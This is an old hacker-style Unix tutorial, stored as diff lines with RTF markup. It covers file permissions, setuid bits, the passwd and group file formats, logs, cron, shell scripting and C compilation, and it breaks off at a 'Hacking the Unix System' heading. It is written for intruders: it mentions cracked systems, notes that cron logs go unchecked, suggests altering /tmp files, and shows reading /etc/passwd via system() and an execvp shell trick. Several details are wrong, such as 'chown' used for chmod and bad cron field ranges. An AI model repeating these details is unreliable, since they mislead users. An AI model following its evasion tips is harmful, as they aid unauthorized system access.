+-------------------------------------------------------------------------------\par
+\par
+UNIX FILE AND DIRECTORY PROTECTIONS\par
+-----------------------------------\par
+        Every Unix account is assigned a specific user number, and a group \par
+number. This is how the system identifies the user. Therefore, 2 accounts with \par
+different usernames but the same user number would be considered by the system \par
+to be the same id. These user and group numbers are what Unix uses to determine \par
+file and directory access privileges.\par
+        Unix has three different file/directory permissions: read, write, and \par
+execute. This how these permissions affect access to files:\par
+\par
+read    -Allows a user to view the contents of the file.\par
+write   -Allows a user to change the contents of a file.\par
+execute -Allows a user to execute a file (if it is an executable type of file;\par
+        if it isn't, the user will get an error when trying to execute it).\par
+\par
+This is how these permissions affect access to directories:\par
+\par
+read    -Allows a user to list out the files in a directory (ls).\par
+write   -Allows a user to save and delete files in this directory.\par
+execute -If a user has execute access to a directory, he can go to that dir-\par
+        ectory with the cd command. If he also has read permission to that dir-\par
+        ectory, he can also copy files from it and gain information on the \par
+        permissions for that directory and the files it contains, with the "l"\par
+        option to the ls command, which will be explained soon.\par
+\par
+        Unix divides users into 3 classes: user (the owner of the file or dir-\par
+ectory), group (members of the owner's group), and other (anyone who doesn't \par
+fit into the first two classes). You can specify what permissions to give to a \par
+file for each class of user.\par
+        To show the permissions of the files in a directory, use "ls -l". This \par
+will list the contents of the directory (as in ls), and will show each's \par
+permissions. For example:\par
+        $ls\par
+        bin     startrek\par
+        $ ls -l\par
+        drwxrwxrwx   1   bin      sys 12345   Mar 10  01:30   bin\par
+        -rwxr-xr--   1   guest  users   256   Mar 20  02:25   startrek\par
+\par
+        In the above example, the directory we are in contains a subdirectory \par
+called bin and a file called "startrek". Here is an explantion of the fields:\par
+The first field contains the file's type and permissions. Look at the first \par
+field of the first line, "drwxrwxrwx". Note the "d" at the begginning. Then see \par
+the "-" at the begginging of the first field for the file startrek. This shows \par
+the file type. "D" is a directory. "-" is a file. "c" is a device file. Now, \par
+back to the first field of the first line again. Notice the "rwxrwxrwx". These \par
+are the permissions. The permissions are divided into three groups:\par
+[user][group][other]. R stands for read, w stands for write, and x stand for \par
+execute. "rwxrwxrwx" means that all three classes of users, owner, group, and \par
+other, have read, write, and execute permissions to the directory bin. Now look \par
+at the second line. It reads "rwxr-xr--". Notice the "-"'s in the place of some \par
+of the permissions. This means that the file was not given that permission. \par
+Line 2 shows that the owner has read, write, and execute permissions for the \par
+file startrek, members of the owner's group have read and execute permissions \par
+but not write (notice the "-" in the place of the group part's w), and all \par
+others have only read privileges ("r--"...there are hyphens in the place of the \par
+others part's w and x). \par
+        Now, let's look at the other fields. The second field is a number (in \par
+this case, the number is one for each line). This shows the number of copies of \par
+this file on the system. The third field shows the name of the owner of file \par
+(or directory). The fourth field shows the username of the owner of the file. \par
+The fifth field, which is not shown on some systems, shows the name of the \par
+owner's group.The sixth field shows the size of the file. the seventh field \par
+shows the time and date the file was last modified. the last field shows the \par
+name of the file or directory.\par
+        The command used to change file/directory permissions is chmod. There \par
+are 2 ways to change permissions: symbolically and absolutely. This will \par
+explain both.\par
+        When you change permissions symbolically, only the permissions you \par
+specify to be added or deleted will be changed. The other permissions will \par
+remain as they are. The format is:\par
+chown [u, g, or o] [+ or -] [rwx] [file/directory name]\par
+The following abbreviations are used:\par
+u       -User (the file or directory's owner)\par
+g       -Group (members of the owner's group)\par
+o       -Others (all others)\par
+r       -Read permission\par
+w       -Write permission\par
+x       -Execute permission\par
+\par
+You use u, g, and o to specify which group you wish to change the privileges \par
+for. To add a permission, type "chown [class]+[permissions] [filename]". For \par
+instance, to add group write permissions to the file startrek, type "chown g+w \par
+startrek". To delete permissions, use the "-". For instance, to remove the \par
+owner's write access to the file "startrek", type "chown u-w startrek".\par
+\par
+        When you set file permissions absolutely, any permissions that you do \par
+not give the file or directory are automatically deleted. The format for \par
+setting permissions absolutely is "chown [mode number] filename". You determine \par
+the mode number by adding together the code numbers for the permissions you \par
+wish to give the file. Here are the permissions and their numbers:\par
+\par
+Others execute permission       1\par
+Others write permission         2\par
+Others read permission          4\par
+\par
+Group execute permission        10\par
+Group write permission          20\par
+Group read permission           40\par
+\par
+User (owner) execute permission 100\par
+User (owner) write permission   200\par
+User (owner) read permission    400\par
+\par
+        There are also two special file modes that can be set only absolutely. \par
+These are the UID and GID modes. The UID mode, when applied to an executable \par
+file, means that when another user executes the file, he executes it under the \par
+user number of the owner (in other words, he runs the program as if he were the \par
+owner of the file). If the file has its GID mode bit set, then when someone \par
+executes the file, his group will temporarily be changed to that of the file's \par
+owner. The permission number for the GID mode is 2000, and the number for the \par
+UID mode is 4000. If the uid bit is set, there will be an "S" in the place of \par
+the x in the owner permissions section when you check a file's permissions:\par
+-rwSr-xr-x\par
+If the uid bit is set, and the owner of the file has execute permissions, the S \par
+will not be capitalized:\par
+-rwsr-xr-x\par
+If the gid bit is set, the same applies to the x in the section on group \par
+permissions.\par
+        A short note here is in order on how these permissions affect superuser \par
+accounts. They don't-unless the owner of the file is root. All superuser \par
+accounts have the same user number, which means that the system considers them \par
+all to be the same-that is, they are considered to be the root account. Thus, \par
+superuser accounts are only bound by the protections of files and directories \par
+that they own, and they can easily change the permissions of any files and \par
+directories that they do not have the access to that they wish.\par
+\par
+SPECIAL UNIX FILES\par
+------------------\par
+        This section will detail the purposes of some files that are found on \par
+all systems. There are quite a few of these, and knowing their uses and what \par
+format their entries are in is very useful to the hacker.\par
+\par
+THE FILES\par
+---------\par
+\par
+/etc/passwd     -This is the password file, and is THE single most important \par
+                file on the system. This file is where information on the\par
+                system's accounts are stored. Each entry has 7 fields:\par
+                \par
+                username:password:user#:group#:description:home dir:shell\par
+\par
+                The first field, naturally, is the account's username. The\par
+                second field is the account's password (in an encrypted form).\par
+                If this field is blank, the account doesn't have a password. \par
+                The next field is the account's user number. The fourth field\par
+                is the account's group number. The fifth field is for a\par
+                description of the account. This field is used only in the\par
+                password file, and is often just left blank, as it has no\par
+                significance. The sixth field is the pathname of the account's\par
+                home directory, and the last field is the pathname of the \par
+                account's shell program. Sometimes you may see an account with\par
+                a program besides the standard shell programs (sh, csh, etc.)\par
+                as its shell program. These are "command logins". These \par
+                accounts execute these programs when logging in. For example,\par
+                the "who" command login would have the /bin/who program as its\par
+                shell.\par
+                Here is a typical-looking entry:\par
+\par
+                root:hGBfdJYhdhflK:0:1:Superuser:/:/bin/sh\par
+\par
+                This entry is for the root account. Notice that the encrypted \par
+                form of the password is 13 characters, yet the Unix passwords\par
+                are only 11 characters maximum. The last 2 characters are what\par
+                is called a "salt string", and are used in the encryption\par
+                process, which will be explained in more detail later. Now,\par
+                notice the user number, which is zero. Any account with a user\par
+                number of 0 has superuser capabilities. The group number is 1.\par
+                The account description is "superuser". The account's home dir-\par
+                ectory is the root directory, or "/". The account's shell is\par
+                the bourne shell (sh), which is kept in the directory /bin.\par
+                Sometimes you may see an entry in the password field like this:\par
+                :NHFfnldyNjh,21AB:\par
+                Notice the period after the 13th character, followed by 2\par
+                digits and 2 letters. If an account has an entry like this, the\par
+                account has a fixed expiration date on its password. The first\par
+                digit, in this case 2, shows the maximum number of weeks that\par
+                the account can keep the same password. The second digit shows\par
+                how many weeks must pass before the account can change its \par
+                password. (This is to prevent users from using the same old\par
+                password constantly by changing the password when forced to and\par
+                then changing it back immediately.) The last 2 characters are\par
+                an encrypted form of when the password was last changed.\par
+                Other unusual password field entries you might encounter are:\par
+                ::\par
+                :,21:\par
+                The first entry means that the account has no password. The\par
+                second entry means that the account has no password yet, but\par
+                has a fixed expiration date that wil begin as soon as a pass-\par
+                word is given to it.\par
+                        Now, for an explanation of how the Unix system encrypts\par
+                the passwords. The first thing any hacker thinks of is trying\par
+                decrypt the password file. This is as close to impossible as\par
+                anything gets in this world. I've often heard other "hackers"\par
+                brag about doing this...this is the biggest lie since Moses\par
+                said "I did it". The encryption scheme is a variation on the\par
+                DES (Data Encryption Standard). When you enter the command\par
+                passwd (to change the password), the system will form a 2\par
+                character "salt string" based on the process number of the \par
+                password command you just issued. This 2-character string pro-\par
+                duces a slight change in the way the password is encrypted.\par
+                There are a total of 4096 different variations on the\par
+                encryption scheme caused by different salt string characters.\par
+                This is NOT the same encryption scheme used by the crypt\par
+                utility. The password is NEVER decrypted on the system. When\par
+                you log on, the password you enter at the password prompt is\par
+                encrypted (the salt string is taken from the password file)\par
+                and compared to the encrypted entry in the password file. The\par
+                system generates its own key, and as of yet, I have not\par
+                discovered any way to get the key. The login program does\par
+                not encrypt the password you enter itself, it does so, I \par
+                believe, by a system call.\par
+\par
+/etc/group      -This is the group file. This allows the superuser to give\par
+                certain accounts group access to groups other than their own.\par
+                Entries are in the format:\par
+               \par
+               group name:password:group number:users in this group\par
+\par
+                The first field is the name of the group. The second is the\par
+                field for the group password. In all my experience with Unix,\par
+                I have never seen the password feature used. The third is the\par
+                group's number. The fourth field is a list of the users who\par
+                group access to this group. (Note: this can include users whose\par
+                group number is different from the number of the group whose\par
+                entry you are reading in the group file.) The usernames are\par
+                separated by commas. Here's an example:\par
+\par
+                sys::2:root,sys,adm,lp\par
+\par
+                To change to a new group identity, type "newgrp [group]". If\par
+                the group has a password, you must enter the proper password.\par
+                You cannot change to another group if you are not listed as a\par
+                member of that group in the group file.\par
+                \par
+\par
+/dev/console    -This is the device file for the system console, or the\par
+                system's main terminal.\par
+\par
+/dev/tty##      -The device files for the system's terminals are usually in\par
+                the form tty##, such as tty09, and sometimes ttyaa,ttyab, etc.\par
+                Some ways to make use of the Unix system's treatment of devices\par
+                as files will be explored in the section on Hacking Unix. When\par
+                these files are not in use by a user (in other words, no one's\par
+                logged onto this terminal), the file is owned by root. While a\par
+                user is logged onto a terminal, however, ownership of its \par
+                device file is temporarily transferred to that account.\par
+\par
+/dev/dk##       -These are the device files for the system's disks.\par
+\par
+login files     -There are special files that are in a user's home directory\par
+                that contain commands that are executed when the user logs in.\par
+                The name of the file depends on what shell the user is using.\par
+                Here are the names of the files for the various shells:\par
+                \par
+                Shell           File\par
+                -----           ----\par
+                sh              .profile\par
+                csh             .cshrc\par
+                ksh             .login\par
+                rsh             .profile\par
+\par
+                Some systems also use a file called ".logout" that contains\par
+                commands which are executed upon logoff.\par
+                        These types of files are called shell scripts, and will\par
+                will be explained in the section on Unix Software Development's\par
+                explanation of shell programming.\par
+/usr/adm/sulog  -This is a log of all attempted uses of the su utility. It\par
+                shows when the attempt was made, what account made it, and\par
+                which account the user attempted to assume, and whether or not\par
+                the attempt was successful.\par
+/usr/adm/loginlog\par
+     or\par
+/usr/adm/acct/sum/loginlog- This is a log of all logins to the system. This\par
+                only includes the time and the account's username.\par
+\par
+mbox            -These are files in the home directories of the system's users,\par
+                that contain all the mail messages that they have saved.\par
+\par
+/usr/mail/<user>        -These files in the directory /usr/mail are named after\par
+                        system accounts. They contain all the unread mail for\par
+                        the account they are named after.\par
+/dev/null       -This is the null device file. Anything written to this file is\par
+                just lost forever. Any attempt to read this file will result in\par
+                an immediate control-D (end of file) character.\par
+/tmp    -The directory /tmp provides storage space for temporary files created\par
+        by programs and other processes. This directory will always have\par
+        rwxrwxrwx permissions. Examining these files occasionally reveals some\par
+        interesting information, and if you know what program generates them\par
+        and the format of the information in the file, you could easily change\par
+        the info in the files, thereby changing the outcome of the program.\par
+\par
+THE CRON UTILITIES\par
+------------------\par
+        An understanding of the cron utilities will be necessary to understand \par
+certain parts of the section on Hacking Unix. This section will give a detailed \par
+explanation of the workings of the cron utilities.\par
+        The cron utility is a utility which carries out tasks which must be\par
+performed on a periodic basis. These tasks, and the times when they are to be \par
+carried out, are kept in files in 2 directories: /usr/lib and \par
+/usr/spool/cron.\par
+        The file crontab in the directory /usr/lib contains entries for system \par
+tasks that must be performed on a periodic basis. The format for the entries in \par
+this file is:\par
+\par
+minute hour dayofmonth  monthofyear  dayofweek commandstring\par
+\par
+The first field is the minutes field. This is a value from 0-59.\par
+The second field is the hour field, a value from 0-23.\par
+The third field is the day of the month, a value from 1-31.\par
+The fifth field is the month of the year, a value from 1-2.\par
+The sixth field is the day of the week, a value from 1-7, with monday being 1.\par
+The seventh field is the pathname and any arguments of the task to be carried \par
+out.\par
+\par
+An asterisk in a field means to carry out the task for every value of that \par
+field. For instance, an asterisk in the minutes field would mean to carry out \par
+that task every minute. Here's an example crontab entry:\par
+\par
+0 1 * * *  /bin/sync\par
+\par
+This runs sync command, which is kept in the directory bin, at 1 am every day.\par
+Commands in the file /usr/lib/crontab are performed with root privileges.\par
+        in the directory /usr/spool/crontabs, you will find files named after \par
+system accounts. These files contain cron entries which are the same as those \par
+in the file /usr/lib/crontab, but are carried out under the id of the user the \par
+file is named after. The entries are in the same format.\par
+\par
+BEWARE! When modifying cron files- cron activity is logged! All cron activity \par
+is logged in the file /usr/adm/cronlog. I've found, however, that on most \par
+systems, this file is almost never checked.\par
+\par
+UNIX SOFTWARE DEVELOPMENT\par
+-------------------------\par
+        The Unix operating system was initially created as an enviroment for \par
+software development, and that remains its main use. This section will detail \par
+some of the os's main facilities for software development, the C compiler and \par
+shell programming, and their related utilities. A few of the other languages \par
+will be briefly touched upon at the end of this section, also.\par
+\par
+SHELL PROGRAMMING\par
+-----------------\par
+        The shell is more than a simple command interpreter. It is also a \par
+sophisticated programming tool, with variables, control structures, and the \par
+features of just about any other programming language. Shell programs are \par
+called scripts. Scripts are just text files which contain the names of commands \par
+and programs. When the script is executed, the command and programs whose names \par
+it contains are executed as if you had typed in their names from your keyboard. \par
+There are two ways to execute a shell script: if you have execute permission to \par
+it, you can simply type in its name. Otherwise, (if you have read access to \par
+it), you can type "sh [filename]". Here is a sample shell script:\par
+\par
+who\par
+whoami\par
+\par
+As you can see, it contains the commands who and whoami. When you execute it, \par
+you will see a list of the system's current users (the output of the who \par
+command), and which account you are logged in under (the output of the whoami \par
+command).\par
+        This will concentrate solely on shell programming. While shell \par
+programming is essentially the same with all the shells, there are slight \par
+syntax differences that make shell scripts incompatible with shells that they \par
+were not specifically written for.\par
+\par
+SHELL VARIABLES\par
+---------------\par
+        Like any programming language, the shell can handle variables. To set \par
+the value of a variable, type:\par
+\par
+[variable]=[value]\par
+\par
+For example:\par
+\par
+counter=1\par
+\par
+This will assign the value "1" to the variable counter. If the variable counter \par
+does not already exist, the shell will create it. Note, that there are no \par
+"numeric" variables in shell programming- all the variables are strings. For \par
+instance, we could later type:\par
+\par
+counter=This is a string\par
+\par
+And counter would now be equal to "This is a string". There is a command called \par
+"expr", however, that will let you treat a variable as a numeric value, and \par
+will be explained later.\par
+        When setting the value of a variable, you only use the variable name. \par
+When you specify a variable as an argument to a command or program, however, \par
+you must precede the variable with a dollar sign. For instance:\par
+\par
+user=root\par
+\par
+Now, we want to specify user as an argument to the command "ps -u". We would \par
+type:\par
+\par
+ps -u$user\par
+\par
+Which would, of course, display the processes of the user "root".\par
+\par
+SPECIAL SHELL VARIABLES\par
+-----------------------\par
+        There are certain vaiables which are already pre-defined by the shell, \par
+and have special meaning to it. Here is a list of the more important ones and \par
+their meanings to the shell:\par
+\par
+HOME    -(Notice the caps. All pre-defined variables are in all-caps.) This\par
+        variable contains the pathname of the user's home directory.\par
+\par
+PATH    -This is a good time to explain something which makes Unix a very\par
+        unique operating system. In Unix, there are no commands "built-in" to\par
+        the operating system. All the commands are just regular programs. The\par
+        PATH variable contains a list of the pathnames of directories. When you\par
+        type in the name of a command or program, the shell searches through\par
+        the directories listed in the PATH variable (in the order specified in\par
+        the variable) until it finds a program with the same name as the name\par
+        you just typed in. The format for the list of directories in the PATH\par
+        variable is:\par
+        \par
+        [pathname]:[pathname]:[pathname]...\par
+\par
+        For example, the default searchpath is usually:\par
+\par
+        /bin:/usr/bin:/usr/local\par
+\par
+        A blank entry in the pathname, or an entry for ".", means to check the\par
+        directory the user is currently in. For instance, all these paths\par
+        contain blank or "." entries:\par
+\par
+        .:/bin:/usr/bin         [Notice . at begginning of path]\par
+        :/bin:/usr/bin          [Notice that path begins with :]\par
+        /bin:/usr/bin:          [Note that path ends with :    ]\par
+\par
+PS1     -This variable contains the shell prompt string. The default is usually\par
+        "$" ("&" if you're using BSD Unix). If you have the "&" prompt, and\par
+        wish to have the dollar sign prompt instead, just type:\par
+\par
+        PS1=$\par
+\par
+TERM    -This contains the type of terminal you are using. Common terminal\par
+        types are:\par
+        \par
+        ansi    vt100   vt52    vt200   ascii   tv150\par
+\par
+        And etc... Just type "TERM=[termtype]" to set your terminal type.\par
+\par
+COMMAND LINE VARIABLES\par
+----------------------\par
+        Command line variables are variables whose values are set to arguments \par
+entered on the command line when you execute the shell script. For instance, \par
+here is a sample shell script called "repeat" that uses command line variables:\par
+\par
+echo $1\par
+echo $2\par
+echo $3\par
+\par
+The echo command prints out the values following it. In this case, it will \par
+print out the values of the variables $1, $2, and $3. These are the command \par
+line variables. For instance, $1 contains the value of the first argument you \par
+entered on the command line, $2 contains the second, $3 contains the third, an \par
+so on to infinity. Now, execute the script:\par
+\par
+repeat apples pears peaches\par
+\par
+The output from the "repeat" shell script would be:\par
+\par
+apples\par
+pears\par
+peaches\par
+\par
+Get the idea?\par
+\par
+SPECIAL COMMAND LINE VARIABLES\par
+------------------------------\par
+        There are 2 special command line variables, $O and $#. $O contains the \par
+name of command you typed in (in the last example, $O would be repeat). $# \par
+contains the number of arguments in the command line. (In the last example, $# \par
+would be 3.)\par
+\par
+SPECIAL COMMANDS FOR SHELL PROGRAMS\par
+-----------------------------------\par
+        These commands were added to the Unix os especially for shell \par
+programming. This section will list them, their syntax, and their uses.\par
+\par
+read    -This command reads the value of a variable from the terminal. The\par
+        format is: "read [variable]". For example, "read number". The variable\par
+        is not preceded by a dollar sign when used as an argument to this com-\par
+        mand.\par
+\par
+echo    -This command displays information on the screen. For example,\par
+        "echo hello" would display "hello" on your terminal. If you specify\par
+        a variable as an argument, it must be preceded by a dollar sign, for\par
+        example "echo $greeting".\par
+\par
+trap    -This command traps certain events, such as the user being disconnected\par
+        or pressing the break key, and tells what commands to carry out if they\par
+        occur. The format is: trap "commands" eventcodes. the event codes are:\par
+        2 for break key, and 1 for disconnect. You can specify multiple com-\par
+        mands with the quotation marks, separating the commands with a semi-\par
+        colon (";"). For example:\par
+\par
+        trap "echo 'hey stupid!'; echo 'don't hit the break key'" 2\par
+\par
+        Would echo "Hey stupid!" and "Don't hit the break key" if the user hits\par
+        the break key while the shell script is being executed.\par
+\par
+exit    -This command terminates the execution of a shell procedure, and ret-\par
+        urns a diagnostic value to the enviroment. The format is:\par
+        "exit [value]", where value is 0 for true and 1 for false. The meaning\par
+        of the value parameter will become clear later, in the section on\par
+        the shell's provisions for conditional execution. If the shell script\par
+        being executed is being executed by another shell script, control is\par
+        passed to the next highest shell script.\par
+\par
+ARITHMETIC WITH EXPR\par
+--------------------\par
+        The expr command allows you to perform arithmetic on the shell \par
+variables, and sends the output to the screen. (Though the output may be \par
+redirected.) The format is:\par
+\par
+expr [arg] [function] [arg] [function] [arg]...\par
+\par
+Where [arg] may be either a value, or a variable (preceded by a dollar sign), \par
+and [function] is an arithmetic operation, one of the following:\par
+\par
++       -Add.\par
+-       -Subtract.\par
+\\*      -Multiply.\par
+/       -Divide.\par
+%       -Remainder from a division operation.\par
+\par
+For example:\par
+\par
+$ num1=3\par
+$ num2=5\par
+$ expr num1 + num2\par
+ 8\par
+$\par
+\par
+TEXT MANIPULATION WITH SORT\par
+---------------------------\par
+        The sort command sorts text by ASCII or numeric value. The command \par
+format is:\par
+\par
+sort [field][option]... file\par
+\par
+where file is the file you wish to sort. (The sort command's input may be \par
+redirected, though, just as its output, which is ordinarily to the screen, can \par
+be.) The sort command sorts by the file's fields. If you don't specify any \par
+specific field, the first field is assumed. for example, say this file \par
+contained names and test scores:\par
+\par
+Billy Bob       10\par
+Tom McKann      5\par
+Doobie Kairful  20\par
+\par
+the file's fields would be first name, last name, and score. So, to sort the \par
+above file (called "students") by first name, you would issue the command:\par
+\par
+sort students\par
+\par
+And you would see:\par
+\par
+Billy Bob       10\par
+Doobie Kairful  20\par
+Tom McKann      5\par
+\par
+If you wanted to sort the file's entries by another field, say the second field \par
+of the file "students" (last names), you would specify:\par
+\par
+sort +1 students\par
+\par
+The +1 means to skip ahead one field and then begin sorting. Now, say we wanted \par
+to sort the file by the 3rd field (scores). We would type:\par
+\par
+sort +2 students\par
+\par
+to skip 2 fields. But the output would be:\par
+\par
+Billy Bob       10\par
+Tom McKann      5\par
+Doobie Kairful  20\par
+\par
+Notice that the shorter names came first, regardless of the numbers in the \par
+second field. There is a reason for this- the spaces between the second and 3rd \par
+fields are considered to be part of the 3rd field. You can tell the sort \par
+command to ignore spaces when sorting a field, however, using the b option. The \par
+format would be:\par
+\par
+sort +2b students\par
+\par
+but...another error! The output would be:\par
+\par
+Billy Bob       10\par
+Doobie Kairful  20\par
+Tom McKann      5\par
+\par
+Why did the value 5 come after 10 and 20? Because the sort command wasn't \par
+really sorting by numeric value- it was sorting by the ASCII values of the \par
+characters in the third field, and 5 comes after the digits 1 and 2. We could \par
+specify that the field be treated by its numerical value by specifying the n \par
+option:\par
+\par
+sort +2n students\par
+\par
+Output: \par
+\par
+Tom McKann      5\par
+Billy Bob       10\par
+Doobie Kairful  20\par
+\par
+Notice that if we use the n option, blanks are automatically ignored.\par
+\par
+We can also specify that sort work in the reverse order on a field. For \par
+example, if we wanted to sort by last names in reverse order:\par
+\par
+sort +1r students\par
+\par
+Output:\par
+\par
+Tom McKann      5\par
+Doobie Kairful  20\par
+Billy Bob       10\par
+\par
+By using pipes, you can direct the output of one sort command to the input of \par
+yet another sort command, thus allowing you to sort a file by more than one \par
+field. This makes sort an excellent tool for text manipulation. It is not, \par
+however, the only one. Remember, you can use any Unix command or program in a \par
+shell script, and there are many different commands for text manipulation in \par
+Unix, such as grep (described in an earlier section on basic commands). \par
+Experiment with the different commands and ways of using them.\par
+\par
+LOOPING\par
+-------\par
+        The for/do loop is a simple way to repeat a step for a certain number \par
+of times. The format is:\par
+\par
+for [variable] in [values]\par
+do [commands]\par
+done\par
+\par
+You do not precede the variable with a dollar sign in this command. The for/do \par
+loop works by assigning the variable values from the list of values given, one \par
+at a time. For example:\par
+\par
+for loopvar in 1 2 3 5 6 7\par
+do echo $loopvar\par
+done\par
+\par
+On the first pass of the loop, loopvar would be assigned the value 1, on the \par
+second pass 2, on the third pass 3, on the fourth pass 5, on the fifth pass 6, \par
+and on the sixth pass 7. I skipped the number 4 to show that you do not have to \par
+use values in numerical order. In fact, you don't have to use numerical \par
+arguments. You could just as easily have assigned loopvar a string value:\par
+\par
+for loopvar in apples peaches pears\par
+do echo "This pass's fruit is:"\par
+   echo $loopvar\par
+done\par
+\par
+Note that you can also specify multiple commands to be carried out in the do \par
+portion of the loop.\par
+\par
+SELECTIVE EXECUTION WITH CASE\par
+-----------------------------\par
+        The case command allows you to execute commands based on the value of a \par
+variable. The format is:\par
+\par
+case [variable] in\par
+\par
+        [value])        commands\par
+                        commands\par
+                        commands;;\par
+       [value2])        commands\par
+                        commands;;\par
+       [value3])        ...and so on\par
+        esac\par
+\par
+For example:\par
+\par
+case $choice in\par
+        1)      echo "You have chosen option one."\par
+                echo "This is not a good choice.";;\par
+\par
+        2)      echo "Option 2 is a good choice.";;\par
+\par
+        *)      echo "Invalid option.";;\par
+        esac\par
+\par
+Now, to explain that:\par
+        If the variable choice's value is "1", the commands in the section for \par
+the value 1 are carried out until a pair of semicolons (";;") is found. The \par
+same if the value of choice is "2". Now, note the last entry, "*". This is a \par
+wildcard character. This means to execute the commands in this section for any \par
+other value of choice. Easac signals the end of the list of execution options \par
+for case.\par
+\par
+DETERMINING TRUE/FALSE CONDITIONS WITH TEST\par
+-------------------------------------------\par
+        The test command tests for various conditions of files and variables \par
+and returns either a true value (0) or a false value (1), which is used in \par
+conjuction with the if/then statements to determine whether or not a series of \par
+commands are executed. There are several different formats for test, depending \par
+on what kind of condition you are testing for. When using variables with test, \par
+you must always precede the variable with a dollar sign.\par
+\par
+NUMERIC TESTS\par
+-------------\par
+Format:\par
+test [arg1] option [arg2]\par
+\par
+the arguments can either be numbers or variables.\par
+\par
+OPTIONS         TESTS TRUE IF\par
+-------         -------------\par
+-eq             arg1=arg2\par
+-ne             arg1<>arg2\par
+-gt             arg1>arg2\par
+-lt             arg1<arg2\par
+-ge             arg1>=arg2\par
+-le             arg1<=arg2\par
+\par
+FILETYPE TESTS\par
+-------------\par
+Format:\par
+test [option] file or directory name\par
+\par
+OPTIONS         TESTS TRUE IF\par
+-------         -------------\par
+-s              file or directory exists and is not empty\par
+-f              the "file" is a file and not a directory\par
+-d              the "file" is really a directory\par
+-w              the user has write permission to the file/directory\par
+-r              the user has read permission to the file/directory\par
+\par
+CHARACTER STRING TESTS\par
+----------------------\par
+Format:\par
+test [arg1] option [arg2]\par
+The arguments can be either strings of characters or variables with character \par
+string values.\par
+\par
+OPTIONS         TESTS TRUE IF\par
+-------         -------------\par
+=               arg1=arg2\par
+!=              arg<>arg2\par
+\par
+A note here about string tests. You must enclose the names of the variables in \par
+quotation marks (like "$arg1") if you wish the test to take into consideration \par
+spaces, otherwise space characters are ignored, and "    blue" would be \par
+considered the same as "blue".\par
+\par
+TESTING FOR THE EXISTANCE OF A STRING OF CHARACTERS\par
+---------------------------------------------------\par
+Format:\par
+test [option] arg\par
+Arg is a variable.\par
+\par
+OPTIONS         TESTS TRUE IF\par
+-------         -------------\par
+-z              variable has a length of 0\par
+-n              variable has a length greater than 0\par
+\par
+COMBINING TESTS WITH -A AND -O\par
+------------------------------\par
+        These options stand for "and" (-a) and "or" (-o). They allow you to \par
+combine tests, for example:\par
+\par
+test arg1 = arg2 -o arg1 = arg3\par
+\par
+means that a true condition is returned if arg1=arg2 or arg1=arg3.\par
+\par
+\par
+CONDITIONAL EXECUTION WITH IF/THEN/ELSE/ELIF\par
+--------------------------------------------\par
+Format:\par
+if [this condition is true]\par
+then [do these commands]\par
+fi\par
+\par
+Example:\par
+\par
+if test arg1 = arg2\par
+then echo "argument 1 is the same as argument 2"\par
+fi\par
+\par
+This is pretty much self-explanatory. If the condition test on the if line \par
+returns a true value, the the commands following "then" are carried out until \par
+the fi statement is encountered.\par
+\par
+Format:\par
+if [this condition is true]\par
+then [do these commands]\par
+else [do these commands]\par
+fi\par
+\par
+Again, pretty much self explanatory. The same as the above, except that if the \par
+condition isn't true, the commands following else are carried out, until fi is \par
+encountered.\par
+\par
+Format:\par
+if [this condition is true]\par
+then [do these commands]\par
+elif [this condition is true]\par
+then [do these commands]\par
+fi\par
+\par
+The elif command executes another condition test if the first condition test is \par
+false, and if the elif's condition test returns a true value, the command for \par
+its then statement are then carried out. Stands for "else if".\par
+\par
+WHILE/DO LOOPS\par
+--------------\par
+Format:\par
+while [this condition is true]\par
+then [do these commands]\par
+done\par
+\par
+Repeats the commands following "then" for as long as the condition following \par
+"while" is true. Example:\par
+\par
+while test $looper != "q"\par
+then read looper\par
+     echo $looper\par
+done\par
+\par
+while will read the value of the variable looper from the keyboard and display \par
+it on the screen, and ends if the value of looper is "q".\par
+\par
+SUMMARY\par
+-------\par
+        This small tutorial by no means is a complete guide to shell \par
+programming. Look at shell scripts on the systems you crack and follow their \par
+examples. Remember, that you can accomplish a great deal by combining the \par
+various control structures (such as having an if/then conditional structure \par
+call up a while/do loop if the condition is true, etc.) and by using I/O \par
+redirection, pipes, etc. My next Unix file will cover more advanced shell \par
+programming, and examine shell programming on another popular shell, the \par
+Berkely C shell.\par
+\par
+THE C COMPILER\par
+--------------\par
+        C is sort of the "official" language of Unix. Most of the Unix \par
+operating system was written in C, and just about every system I've ever been \par
+on had the C compiler. The command to invoke the c compiler is cc. The format \par
+is "cc [filename]", where filename is the name of the file which contains the \par
+source code. (The filename must end in .c) You can create the source code file \par
+with any of the system's text editors. The include files, stdio.h and others, \par
+are kept in a directory on the system. You do not have to have a copy of \par
+these files in your current directory when you compile the file, the compiler \par
+will search this directory for them. If you wish to include any files not in \par
+the include library, they must be in your current directory. The compiled \par
+output will be a file called "a.out" in your current directory.\par
+\par
+COMPILING INDIVIDUAL MODULES\par
+----------------------------\par
+        If you're working on a very large program, you will probably want to \par
+break it up into small modules. You compile the individual modules with the -c \par
+option, which only generates the object files for the module. Then, use the \par
+link editor to combine and compile the object files. The object files will be \par
+generated with the same name as the source files, but the file extension will \par
+be changed from .c to .o   When you have created all the object files for all \par
+of the modules, combine them with the ld (link editor) like this:\par
+\par
+ld /lib/crtO.o [module] [module]... -lc\par
+\par
+which will give you the final, compiled program, in a file named a.out. For \par
+example:\par
+\par
+ld /lib/crtO.o part1.o part2.o -lc\par
+\par
+You must remeber to include /lib/crtO.o and the -lc parts in the command, in \par
+the order shown. Also, the object files must be specified in the ld command \par
+in the order that they must be in the program (for instance, if part1 called \par
+part2, part2 can't be BEFORE part1).\par
+\par
+CHECKING FOR ERRORS IN C PROGRAMS\par
+---------------------------------\par
+        The lint command checks for errors and incompatibility errors in C \par
+source code. Type "lint [c source-code file]". Not all of the messages returned \par
+by lint are errors which will prevent the program from compiling or executing \par
+properly. As stated, it will report lines of code which may not be \par
+transportable to other Unix systems, unused variables, etc.\par
+\par
+C BEAUTIFIER\par
+------------\par
+        The cb (C beautifier) program formats C source code in an easy to read, \par
+"pretty" style. The format is "cb [file]". The output is to the screen, so if \par
+you want to put the formatted source code into a file, you must redirect the \par
+output.\par
+\par
+SPECIAL C COMMANDS\par
+------------------\par
+        The Unix C compiler has a command called system that executes Unix \par
+commands and programs as if you had typed in the commands from the keyboard. \par
+The format is:\par
+\par
+system("command line")\par
+\par
+Where command line is any command line you can execute from the shell, such as:\par
+\par
+system("cat /etc/passwd")\par
+\par
+Another command which performs a similar function is execvp. The format is:\par
+\par
+execvp("command")\par
+\par
+An interesting trick is to execute a shell program using execvp. This will make \par
+the program function as a shell.\par
+\par
+HACKING THE UNIX SYSTEM\par
